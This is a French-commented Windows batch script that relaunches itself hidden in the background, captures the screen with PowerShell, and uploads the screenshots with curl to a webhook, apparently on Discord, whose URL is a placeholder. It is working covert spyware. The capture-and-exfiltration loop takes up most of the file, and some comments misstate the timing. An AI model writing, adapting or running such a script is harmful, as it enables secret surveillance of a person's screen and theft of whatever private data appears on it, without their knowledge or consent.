@echo off
if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
setlocal enabledelayedexpansion


:: 📌 Définition des variables
set WEBHOOK_URL=https://teste
set SCREENSHOT_PATH=%TEMP%\screenshot.png

set END_TIME=%TIME:~0,2%
set /A END_TIME+=0
set /A END_TIME+=1


set photo=true
    set NbPhoto=2
    set TempsEntre=0.5
::

set message=true
    set MESSAGE1=Bonjour
::



if %message%==true (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE1%\"}" %WEBHOOK_URL%
)




if %photo%==true (
    :: Si "photo" est égal à 1, prend une capture d'écran et l'envoie
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Lancement_des_capture\"}" %WEBHOOK_URL%

    :: 📸 Fonction pour prendre une capture d'écran
    :TAKE_SCREENSHOT
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('%SCREENSHOT_PATH%', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose();"

    :: 🖼 Vérifier que la capture a bien été prise
    if not exist "%SCREENSHOT_PATH%" (
        echo ❌ Erreur : Capture d'écran non trouvée !
        pause
        exit /b
    )

    :: 🚀 Envoyer la capture à Discord
    curl -F "file=@%SCREENSHOT_PATH%" %WEBHOOK_URL%

    :: 🎯 Vérification du temps d'envoi (toutes les 10 secondes pendant 30 secondes)
    set /A COUNT+=1
    if !COUNT! geq %NbPhoto% (
        curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Fin_des_capture\"}" %WEBHOOK_URL% 
        goto END
    )

    :: Pause de 10 secondes avant la prochaine capture
    timeout /t %TempsEntre% >nul
    goto TAKE_SCREENSHOT


)



:END



